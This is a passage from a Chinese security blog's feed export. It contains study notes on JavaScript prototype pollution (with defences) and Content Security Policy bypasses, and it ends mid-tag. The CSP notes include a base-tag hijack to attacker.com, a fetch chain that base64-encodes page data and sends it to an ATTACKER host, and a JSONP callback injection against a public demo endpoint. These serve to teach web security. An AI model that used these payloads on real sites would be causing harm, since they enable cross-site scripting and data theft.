    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="39158d880ff08f9d8fc06f77dad95e27932c656da8d78ad04274cec4c65018c7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码阅读</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>前端安全7-原型链污染（笔记）</title>
    <link href="http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-02T05:24:12.000Z</published>
    <updated>2023-10-13T00:32:32.567Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10317892">https://ithelp.ithome.com.tw/articles/10317892</a></li></ul><blockquote><p>有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要<br><a href="https://ithelp.ithome.com.tw/articles/10317133">Universal XSS</a><br><a href="https://ithelp.ithome.com.tw/articles/10316778">Mutation XSS</a><br><span id="more"></span></p></blockquote><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>总感觉自己讲不清楚，还是去看别人写的吧<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><br>当用JSON.parse可以把<strong>proto</strong>当为纯键值。<br>调试分析了一下，发现在第二层的时候会判断<code>__proto__</code>是否在对象中，对于target来说是原型链存在，对于source来说是普通的键值，就是<code>&#123;&#39;b&#39;:2&#125;</code><br>当然也可以用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;constructor&quot;: &#123;&quot;prototype&quot;:&#123;&quot;b&quot;: 2&#125;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><br>在控制台输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">__proto__</span> == obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> </span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure></p><h2 id="constructor-和-prototype"><a href="#constructor-和-prototype" class="headerlink" title="constructor 和 prototype"></a>constructor 和 prototype</h2><p>这时候会引出一个问题，就是经常会看到，一会是<code>constructor.prototype</code>，一会又是<code>prototype.constructor</code>，这时候就很容易搞混<br>可以参考这篇文章，我感觉我自己都有点迷糊<br><a href="https://wangdoc.com/javascript/oop/prototype">https://wangdoc.com/javascript/oop/prototype</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;二毛&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span><span class="comment">//false</span></span><br></pre></td></tr></table></figure></p><p>同样是<code>constructor.prototype</code>，Animal是Function，cat1是Object<br><code>cat1.constructor</code>指向他的构造函数，也就是<code>Animal</code><br><code>Animal.constructor</code>也是指向他的构造函数，但是是<code>Function</code>，所以下面的就会是true<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p><p><code>__proto__</code>可以用来访问对象的原型，也就是<code>prototype</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat1.<span class="property">__proto__</span>.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">__proto__</span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure><br>原理这些还是自己去找资料吧，感觉我讲的也不清晰</p><h1 id="Prototype-pollution-script-gadgets"><a href="#Prototype-pollution-script-gadgets" class="headerlink" title="Prototype pollution script gadgets"></a>Prototype pollution script gadgets</h1><p><a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="过滤字符串过滤"><a href="#过滤字符串过滤" class="headerlink" title="过滤字符串过滤"></a>过滤字符串过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key === <span class="string">&quot;constructor&quot;</span> || key == <span class="string">&#x27;__proto__&#x27;</span> || key == <span class="string">&quot;prototype&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;No pollution&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建一个空对象"><a href="#创建一个空对象" class="headerlink" title="创建一个空对象"></a>创建一个空对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;a&#x27; of undefined</span></span><br></pre></td></tr></table></figure><h2 id="冻结prototype"><a href="#冻结prototype" class="headerlink" title="冻结prototype"></a>冻结prototype</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure><p>不会报错，只是不能被修改，可能会增加debug的难度</p><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><p>通过<code>--disable-proto</code>关掉<code>prototype</code><br><a href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">官方文档</a></p><h1 id="隐形的前端gadget"><a href="#隐形的前端gadget" class="headerlink" title="隐形的前端gadget"></a>隐形的前端gadget</h1><p>可以通过更改前端的API的一些变量<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = <span class="string">&#x27;a=1&#x27;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>例如上面这种，就会把本来应该发送GET请求的代码，变成发送POST<br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p><p>有时候有些条件可以让你直接把<code>fetch</code>给覆盖了，这样他的代码都会走你的假<code>fetch</code>，这也是爬虫里面经常用到的技巧<br>例如下面的代码，参考 <a href="https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA">https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook JSON.stringify ——&gt; &quot;</span>, params);</span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">stringify</span>(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> open = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span> (<span class="params">method, url, <span class="keyword">async</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.<span class="title function_">indexOf</span>(<span class="string">&quot;rnd&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> open.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>把原来的API备份一份，然后在把原来的API给覆盖了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317892&quot;&gt;https://ithelp.ithome.com.tw/articles/10317892&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317133&quot;&gt;Universal XSS&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316778&quot;&gt;Mutation XSS&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全6-CSP绕过（笔记）</title>
    <link href="http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-01T17:20:04.000Z</published>
    <updated>2023-10-02T05:18:40.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10316449">https://ithelp.ithome.com.tw/articles/10316449</a><span id="more"></span></li></ul><h1 id="不安全的domain"><a href="#不安全的domain" class="headerlink" title="不安全的domain"></a>不安全的domain</h1><p>有一些三方库存在0day<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CanardMandarin/csp-bypass</span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://unpkg.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> <span class="attr">csp</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="通过base标签绕过"><a href="#通过base标签绕过" class="headerlink" title="通过base标签绕过"></a>通过base标签绕过</h1><p>假设加上了nonce，且无法被猜测<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就会无法加载<code>my.js</code><br>但是如果用下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>通过改变base，然后去加载攻击者的<code>app.js</code><br>修复方法就是用上一章里面有的<code>base-uri &#39;none&#39;</code></p><h1 id="JSONP绕过"><a href="#JSONP绕过" class="headerlink" title="JSONP绕过"></a>JSONP绕过</h1><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>因为同源策略，如果想向其他网站取出数据，通过下面的代码是无法取出数据的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>会爆出上面的错误，但是加载别人的js代码是没问题的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsoncallback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;customername1&quot;,&quot;customername2&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>别人调用一个函数，函数名是你自己的请求的，然后你这边把函数设计一下就行了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divCustomers&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>这段代码是我从runoob抄下来的，他加了个htmlspecialchars，但是并没有什么卵用，直接绕<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=alert(1);callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>有一个仓库收集了一些jsonp，可以被绕过<br><a 